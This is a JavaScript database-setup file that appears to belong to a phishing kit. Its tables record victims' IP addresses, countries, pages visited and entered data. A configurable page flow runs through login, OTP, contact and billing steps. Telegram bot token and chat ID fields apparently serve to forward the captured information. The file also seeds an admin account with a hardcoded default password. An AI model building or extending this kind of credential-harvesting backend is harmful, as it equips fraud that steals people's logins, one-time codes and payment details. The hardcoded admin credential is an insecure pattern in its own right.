// db.js
import sqlite3 from "sqlite3";
import { open } from "sqlite";
import bcrypt from "bcrypt"; // if you need it for initial admin

let dbPromise;

export async function initDB() {
  if (!dbPromise) {
    dbPromise = open({
      filename: "./database.db",
      driver: sqlite3.Database,
    });

    const db = await dbPromise;

    // Create tables
    await db.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        status TEXT,
        last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
        page TEXT,
        ip TEXT,
        country TEXT,
        input_data TEXT,
        identifier TEXT
      );
    `);

    await db.exec(`
      CREATE TABLE IF NOT EXISTS results (
        user_id TEXT UNIQUE,
        message TEXT,
        user_info TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
      );
    `);

    await db.exec(`
      CREATE TABLE IF NOT EXISTS admin_settings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        autopilot INTEGER DEFAULT 0 CHECK (autopilot IN (0,1)),
        userDisp TEXT,
        BotToken TEXT,
        ChatID TEXT,
        TelegramEnabled INTEGER DEFAULT 0 CHECK (TelegramEnabled IN (0,1)),
        baSUB INTEGER DEFAULT 0 CHECK (baSUB IN (0,1)),
        pageFlow TEXT NOT NULL DEFAULT '{
          "1": "login",
          "2": "otp",
          "3": "contact",
          "4": "bill",
          "5": "final"
        }'
      );
    `);

    await db.exec(`
      CREATE TABLE IF NOT EXISTS admins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
    `);

    // Insert default admin_settings row if it doesn't exist
    await db.exec(`
      INSERT INTO admin_settings (id, autopilot, userDisp, BotToken, ChatID, TelegramEnabled, baSUB)
      SELECT 1, 0, '', '', '', 0, 0
      WHERE NOT EXISTS (SELECT 1 FROM admin_settings);
    `);

    // Insert default admin if it doesn't exist
    const hash = await bcrypt.hash("UpdateTeam12", 12);
    await db.run(
      `INSERT OR IGNORE INTO admins (username, password_hash) VALUES (?, ?)`,
      ["admin", hash]
    );
  }

  return dbPromise;
}